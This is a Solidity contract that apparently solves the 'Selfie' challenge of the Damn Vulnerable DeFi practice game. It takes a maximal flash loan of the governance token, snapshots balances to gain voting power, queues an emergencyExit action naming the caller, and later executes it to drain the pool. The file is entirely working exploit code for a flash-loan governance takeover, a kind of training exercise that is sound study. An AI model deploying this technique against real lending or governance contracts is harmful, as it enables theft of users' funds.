// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./ISimpleGovernance.sol";
import "./SelfiePool.sol";

contract Exploiter is IERC3156FlashBorrower {

    ISimpleGovernance public immutable governance;
    SelfiePool public immutable pool;
    DamnValuableTokenSnapshot public immutable token;
    uint256 private actionId;

    constructor(address _gov, address _pool) {
        governance = ISimpleGovernance(_gov);
        pool = SelfiePool(_pool);
        token = DamnValuableTokenSnapshot(governance.getGovernanceToken());
        token.approve(address(pool), type(uint256).max);
    }


    function onFlashLoan(
        address,
        address,
        uint256,
        uint256,
        bytes calldata _data
    ) external override returns (bytes32) {
        token.snapshot();
        actionId = governance.queueAction(
            address(pool),
            0,
            _data
        );
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAttack() external {
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)", msg.sender 
        );
        pool.flashLoan(
            this,
            address(token),
            pool.maxFlashLoan(address(token)),
            data
        );
    }

    function drainPool() external {
        governance.executeAction(actionId);
    }
}

